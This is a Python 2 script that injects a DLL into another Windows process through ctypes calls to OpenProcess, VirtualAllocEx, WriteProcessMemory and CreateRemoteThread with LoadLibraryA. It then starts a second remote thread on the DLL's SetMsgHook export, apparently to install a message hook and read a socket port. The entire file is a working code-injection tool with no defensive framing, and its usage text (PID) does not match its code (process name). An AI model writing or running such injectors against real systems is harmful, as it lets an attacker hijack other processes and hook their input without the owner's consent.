import sys
import ctypes
import ctypes.wintypes

from ctypes.wintypes import BOOL
from ctypes.wintypes import DWORD
from ctypes.wintypes import HANDLE
from ctypes.wintypes import LPVOID
from ctypes.wintypes import LPCVOID

LPCSTR = LPCTSTR = ctypes.c_char_p
LPDWORD = PDWORD = ctypes.POINTER(DWORD)

class _SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [('nLength', DWORD),
                ('lpSecurityDescriptor', LPVOID),
                ('bInheritHandle', BOOL),]
SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPTHREAD_START_ROUTINE = LPVOID
LPSECURITY_ATTRIBUTES = ctypes.POINTER(_SECURITY_ATTRIBUTES)
OpenProcess = ctypes.windll.kernel32.OpenProcess
OpenProcess.restype = HANDLE
OpenProcess.argtypes = (DWORD, BOOL, DWORD)

VirtualAllocEx = ctypes.windll.kernel32.VirtualAllocEx
VirtualAllocEx.restype = LPVOID
VirtualAllocEx.argtypes = (HANDLE, LPVOID, DWORD, DWORD, DWORD)

ReadProcessMemory = ctypes.windll.kernel32.ReadProcessMemory
ReadProcessMemory.restype = BOOL
ReadProcessMemory.argtypes = (HANDLE, LPCVOID, LPVOID, DWORD, DWORD)

WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
WriteProcessMemory.restype = BOOL
WriteProcessMemory.argtypes = (HANDLE, LPVOID, LPCVOID, DWORD, DWORD)

CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
CreateRemoteThread.restype = HANDLE
CreateRemoteThread.argtypes = (HANDLE, LPSECURITY_ATTRIBUTES, DWORD, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)

GetLastError = ctypes.windll.kernel32.GetLastError
GetLastError.restype = DWORD
GetLastError.argtypes = ()

GetModuleHandle = ctypes.windll.kernel32.GetModuleHandleA
GetModuleHandle.restype = HANDLE
GetModuleHandle.argtypes = (LPCTSTR,)

GetProcAddress = ctypes.windll.kernel32.GetProcAddress
GetProcAddress.restype = LPVOID
GetProcAddress.argtypes = (HANDLE, LPCTSTR)

def getpid(process_name):
    import os
    return [item.split()[1] for item in os.popen('tasklist').read().splitlines()[4:] if process_name in item.split()]

if (len(sys.argv) != 3):
    print "Usage: %s <PID> <Path To DLL>" %(sys.argv[0])
    print "Eg: %s 1111 C:\\test\messagebox.dll" %(sys.argv[0])
    sys.exit(0)

PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM = ( 0x1000 | 0x2000 )

pid = getpid(sys.argv[1])[0]
dll_path = sys.argv[2]

dll_len = len(dll_path)
print pid
# Get handle to process being injected...
h_process = OpenProcess( PROCESS_ALL_ACCESS, 0, int(pid) )

print h_process

if not h_process:
    print "[!] Couldn't get handle to PID: %s" %(pid)
    print "[!] Are you sure %s is a valid PID?" %(pid)
    sys.exit(0)

# Allocate space for DLL path
arg_address = VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

print arg_address
# Write DLL path to allocated space

print WriteProcessMemory(h_process, arg_address, dll_path, dll_len, 0)

# Resolve LoadLibraryA Address
h_kernel32 = GetModuleHandle("kernel32.dll")
h_loadlib = GetProcAddress(h_kernel32, "LoadLibraryA")

print h_kernel32
print h_loadlib
# Now we createRemoteThread with entrypoiny set to LoadLibraryA and pointer to DLL path as param
thread_id = DWORD()

if not CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, LPDWORD(thread_id)):
    print "[!] Failed to inject DLL, exit..."
    sys.exit(0)

print "[+] Remote Thread with ID 0x%08x created." %(thread_id.value)

h_mydll = GetModuleHandle(dll_path)
print h_mydll

dll_hin_f = ctypes.cdll.LoadLibrary(dll_path).getDllHinstance
#my_func = getattr(mylib, '_getDllHinstance@0')
print GetProcAddress(dll_hin_f, "getDllHinstance")
print GetProcAddress(dll_hin_f, "getSocketPort")
dll_h = dll_hin_f()
print dll_h


sock_port_f = ctypes.cdll.LoadLibrary(dll_path).getSocketPort
#my_func = getattr(mylib, '_getDllHinstance@0')

sock_port = sock_port_f()
print sock_port

proc_address = ctypes.cdll.LoadLibrary(dll_path).SetMsgHook


if not CreateRemoteThread(h_process, None, 0, proc_address, 0, 0, LPDWORD(DWORD())):
    print "[!] Failed to inject DLL, exit..."
    sys.exit(0)

print "[+] Remote Thread with ID 0x%08x created." %(thread_id.value)